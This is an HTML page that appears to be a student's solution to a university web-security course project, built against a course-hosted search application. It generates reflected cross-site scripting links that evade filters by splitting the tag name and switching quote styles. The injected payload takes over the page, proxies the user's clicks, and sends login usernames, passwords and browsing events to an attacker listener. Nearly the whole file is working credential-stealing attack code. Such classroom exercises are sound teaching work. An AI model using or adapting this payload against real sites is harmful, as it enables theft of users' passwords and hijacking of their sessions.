<html>
<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
</script>
<script>

// normal payload function with normal quotes, works for 3.0-3.3
function payload3(attacker){
	function proxy(href,purl,stat){
		$('html').load(href,function(){
		$('html').show();
			$('a:contains("<script>")').hide();$('a:contains("<sscriptcript>")').hide();
			var ad='http://cis551.cis.upenn.edu/project3/';
			var ru=window.location.href;
			history.replaceState(window.history.state,'/project3','/project3');
		    $('#search-btn').click(function(e){e.preventDefault();
		      var q=$('#query').val().split(' ').join('+');
			  $.ajax({url:ad+'search?q='+q}).done(function(e){document.write(e);
			  	setTimeout(function(){proxy(ad+'search?q='+q,ru,1);},500);});
			  $.get(attacker+'stolen?event=nav&user='+$('#logged-in-user').text()+'&url='+ad+'search?q='+q);
	        });
	        $('#search-again-btn').click(function(e){e.preventDefault();
			  $.get(attacker+'stolen?event=nav&user='+$('#logged-in-user').text()+'&url='+ad+'search');
			  window.location.replace(purl);
	        }); 
		    $('#log-in-btn').click(function(e){
		      e.preventDefault();
			  $.ajax({url:ad+'login?csrfdefense=0',method:'POST',data:{username:$('#username').val(),password:$('#userpass').val()},success:function(){
			    window.location.replace(ru);;}});
			  $.get(attacker+'stolen?event=login&user='+$('#username').val()+'&pass='+$('#userpass').val());
	        });
		    $('#new-account-btn').click(function(e){e.preventDefault();
			  $.ajax({url:ad+'create?csrfdefense=0',method:'POST',data:{username:$('#username').val(),password:$('#userpass').val()},success:function(){
			    window.location.replace(ru);;}});
	        });
		    $('#log-out-btn').click(function(e){e.preventDefault();
			  $.get(attacker+'stolen?event=logout&user='+$('#logged-in-user').text());
			  $.ajax({url:ad+'logout?csrfdefense=0',method:'POST',success:function(){
			  	if(stat==0){window.location.replace(ru);}else{window.location.replace(purl);}}});
	        });
			});
		}
	$('html').hide();
	proxy('./','./',0);
}

// payload function to evade punctuation for 3.4
function payload2(attacker){
	function proxy(href,purl,stat){
		$(`html`).load(href,function(){
		$(`html`).show();
			$(`a`).each(function(){
			if(this.href.indexOf(`sscriptcript`)!=-1||this.href.indexOf(`script`)!=-1){$(this).hide();}});
			var ad=`http://cis551.cis.upenn.edu/project3/`;
			var ru=window.location.href;
			history.replaceState(window.history.state,`/project3`,`/project3`);
		    $(`#search-btn`).click(function(e){
		      var q=$(`#query`).val().split(` `).join(`+`);
			  $.ajax({url:ad+`search?q=`+q}).done(function(e){document.write(e);
			  	setTimeout(function(){;proxy(ad+`search?q=`+q,ru,1);},500);});
			  e.preventDefault();
			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search?q=`+q);
	        });
	        $(`#search-again-btn`).click(function(e){
		      e.preventDefault();
			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search`);
			  window.location.replace(purl);
	        }); 
		    $(`#log-in-btn`).click(function(e){
		      e.preventDefault();
			  $.ajax({url:ad+`login?csrfdefense=0`,method:`POST`,data:{username:$(`#username`).val(),password:$(`#userpass`).val()},success:function(){
			    window.location.replace(ru);;}});
			  $.get(attacker+`stolen?event=login&user=`+$(`#username`).val()+`&pass=`+$(`#userpass`).val());
	        });
		    $(`#new-account-btn`).click(function(e){
		      e.preventDefault();
			  $.ajax({url:ad+`create?csrfdefense=0`,method:`POST`,data:{username:$(`#username`).val(),password:$(`#userpass`).val()},success:function(){
			    window.location.replace(ru);;}});
	        });
		    $(`#log-out-btn`).click(function(e){
		      e.preventDefault();
			  $.get(attacker+`stolen?event=logout&user=`+$(`#logged-in-user`).text());
			  $.ajax({url:ad+`logout?csrfdefense=0`,method:`POST`,success:function(){
			  	if(stat==0){window.location.replace(ru);}else{window.location.replace(purl);}}});
	        });
			});
		}
	$(`html`).hide();
	proxy(`./`,`./`,0);
}


// function to test payload before the actual payload
function test() {
	alert(4);
}

function makeLink(xssdefense, target, attacker) {
		if (xssdefense == 0) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<script" + ">" + payload3.toString() +
			";payload3(\"" + attacker + "\");" + "</" + "script" + ">");
		} else if (xssdefense == 1) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<sscriptcript" + ">" + payload3.toString() +
			";payload3(\"" + attacker + "\");" + "</" + "sscriptcript" + ">");
		} else if (xssdefense == 2) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<sscriptcript" + ">" + payload3.toString() +
			";payload3(\"" + attacker + "\");" + "</" + "sscriptcript" + ">");
		} else if (xssdefense == 3) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<script" + ">" + payload2.toString() +
			";payload2(\`" + attacker + "\`);" + "</" + "script" + ">");
		}
	}

	var xssdefense = 3;
	var target = "http://cis551.cis.upenn.edu/project3/";
	var attacker = "http://127.0.0.1:31337/";

	$(function() {
		var url = makeLink(xssdefense, target, attacker);
		$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
	});

</script>

<h3></h3>
</html>